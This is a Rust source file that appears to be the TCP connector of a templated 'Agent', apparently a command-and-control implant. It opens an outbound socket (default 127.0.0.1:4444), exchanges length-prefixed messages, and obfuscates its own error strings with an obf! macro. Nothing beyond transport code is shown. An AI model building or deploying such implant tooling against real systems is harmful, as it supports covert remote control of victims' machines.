// __NAME__ Agent — TCP Connector
//
// Concrete implementation of the Connector trait for raw TCP transport.
// The base template accepts a simple textual profile: "host:port".

use crate::agent::Connector;
use crate::obf;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

/// TCP connector state.
pub struct ConnectorTCP {
    recv_buffer: Option<Vec<u8>>,
    host: String,
    port: u16,
    stream: Option<TcpStream>,
}

impl ConnectorTCP {
    pub fn new() -> Self {
        ConnectorTCP {
            recv_buffer: None,
            host: "127.0.0.1".to_string(),
            port: 4444,
            stream: None,
        }
    }

    pub fn from_profile(profile: &str) -> Self {
        let mut connector = Self::new();
        let trimmed = profile.trim();
        if trimmed.is_empty() {
            return connector;
        }

        if let Some((host, port)) = trimmed.rsplit_once(':') {
            if let Ok(parsed_port) = port.parse::<u16>() {
                connector.host = host.trim().to_string();
                connector.port = parsed_port;
            }
        } else {
            connector.host = trimmed.to_string();
        }
        connector
    }
}

impl Connector for ConnectorTCP {
    fn connect(&mut self) -> Result<(), String> {
        if self.stream.is_some() {
            return Ok(());
        }

        let addr = format!("{}:{}", self.host, self.port);
        let stream = TcpStream::connect(&addr)
            .map_err(|err| { let mut s = obf!(0xC1, "connect "); s.push_str(&addr); s.push_str(": "); s.push_str(&err.to_string()); s })?;
        let _ = stream.set_read_timeout(Some(Duration::from_secs(30)));
        let _ = stream.set_write_timeout(Some(Duration::from_secs(30)));
        self.stream = Some(stream);
        Ok(())
    }

    fn exchange(&mut self, data: &[u8]) -> Result<Vec<u8>, String> {
        self.connect()?;
        let stream = self
            .stream
            .as_mut()
            .ok_or_else(|| "TCP stream unavailable after connect".to_string())?;

        let len = (data.len() as u32).to_le_bytes();
        stream
            .write_all(&len)
            .map_err(|err| { let mut s = obf!(0xC1, "send size: "); s.push_str(&err.to_string()); s })?;
        if !data.is_empty() {
            stream
                .write_all(data)
                .map_err(|err| { let mut s = obf!(0xC1, "send body: "); s.push_str(&err.to_string()); s })?;
        }

        let mut size_buf = [0u8; 4];
        stream
            .read_exact(&mut size_buf)
            .map_err(|err| { let mut s = obf!(0xC1, "read size: "); s.push_str(&err.to_string()); s })?;
        let size = u32::from_le_bytes(size_buf) as usize;

        let mut response = vec![0u8; size];
        if size > 0 {
            stream
                .read_exact(&mut response)
                .map_err(|err| { let mut s = obf!(0xC1, "read body: "); s.push_str(&err.to_string()); s })?;
        }

        self.recv_buffer = Some(response.clone());
        Ok(response)
    }

    fn disconnect(&mut self) {
        self.recv_buffer = None;
        self.stream = None;
    }
}
